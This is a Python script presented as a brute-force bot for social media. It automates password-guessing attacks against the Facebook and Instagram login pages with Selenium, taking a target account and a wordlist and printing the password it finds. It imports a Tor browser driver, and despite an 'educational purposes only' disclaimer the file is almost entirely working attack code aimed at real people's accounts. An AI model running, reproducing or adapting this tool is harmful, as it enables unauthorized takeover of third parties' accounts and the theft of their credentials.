"""
BRUTEFORCE BOT FOR ANY SOCIAL-MEDIA
@AUTHOR crypt0sploit
@DATE 1 Mar 2019
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import StaleElementReferenceException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from tbselenium.tbdriver import TorBrowserDriver
from selenium.webdriver.common.keys import Keys
import sys
import time

class brute_bot(object):

    def __init__(self, email, password, site, email_field, pass_field, threads, login_btn):
        self.email = email
        self.password = password
        self.site = site
        self.email_field = email_field
        self.pass_field = pass_field
        self.threads = threads
        self.login_btn = login_btn
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument("--no-sandbox")
        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)

    def bruteforcer(self):
        driver = self.driver
        pass_found = False
        driver.get(self.site)

        if sys.argv[1] == 'facebook':
            email_box = driver.find_element(By.ID, self.email_field)
            email_box.clear()
            email_box.send_keys(self.email)

            while not pass_found:
                for i in self.password:
                    try:
                        password_box = driver.find_element(By.ID, self.pass_field)
                        password_box.clear()
                        password_box.send_keys(i)
                        email_box.send_keys(Keys.RETURN)
                        time.sleep(int(sys.argv[3]))
                        old = i
                        print(f"Trying - {i}")
                    except NoSuchElementException:
                        pass_found = True
                        if pass_found == True:
                            print(f'Password is >> {old} ')
                            driver.close()
                            break

        elif sys.argv[1] == "instagram":
            time.sleep(2)
            email_box = driver.find_element(By.NAME, self.email_field)
            email_box.clear()
            email_box.send_keys(self.email)

            while not pass_found:
                for i in self.password:
                    try:
                        password_box = driver.find_element(By.NAME, self.pass_field)
                        # password_box.clear()
                        password_box.send_keys(i)
                        email_box.send_keys(Keys.RETURN)
                        password_box.send_keys(Keys.CONTROL, "a", Keys.DELETE)
                        time.sleep(int(sys.argv[3]))
                        old = i
                        print(f"Trying - {i}")
                    except NoSuchElementException:
                        pass_found = True
                        if pass_found == True:
                            print(f'Password is >> {old} ')
                            driver.close()
                            break

banner = """\n\t

   _____            _       _  _____                _
  / ____|          (_)     | |/ ____|              | |
 | (___   ___   ___ _  __ _| | |     _ __ __ _  ___| | __
  \___ \ / _ \ / __| |/ _` | | |    | '__/ _` |/ __| |/ /
  ____) | (_) | (__| | (_| | | |____| | | (_| | (__|   <
 |_____/ \___/ \___|_|\__,_|_|\_____|_|  \__,_|\___|_|\_\\

            AUTHOR --> crypt0sploit ( Adrian )
            INSTAGRAM --> _adyadrian_aa

        I'M NOT RESPONSABLE FOR ANY OF YOUR ACTIONS!
            USE FOR EDUCATIONAL PURPOSES ONLY!

"""

def main_menu():

    if sys.argv[1] == "facebook":
        site = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=0&lwv=110"
        print(banner)
        print("Waking up BOT...")
        efield = 'email'
        pfield = 'pass'
        loginbutton = 'loginbutton'
        email1 = str(input("\nThe ID of the target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
        execute.bruteforcer()

    elif sys.argv[1] == "instagram":
        site = "https://www.instagram.com/accounts/login/"
        print(banner)
        print("Waking up BOT...")
        efield = 'username'
        pfield = 'password'
        loginbutton = '_ab8w  _ab94 _ab99 _ab9f _ab9m _ab9p  _abak _abb8 _abbq _abb- _abcm'
        email1 = str(input("\nThe Username of the Target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
        execute.bruteforcer()

if __name__ == "__main__":
    try:
        if len(sys.argv) < 4:
            print(f"""
            {banner}
            \nUsage: python3 {sys.argv[0]} [facebook/instagram] [wordlist] [threads]\n\n
            """)
        elif len(sys.argv) == 4:
            main_menu()
    except KeyboardInterrupt:
        print("\n\nABORTED !"+'\n\n')
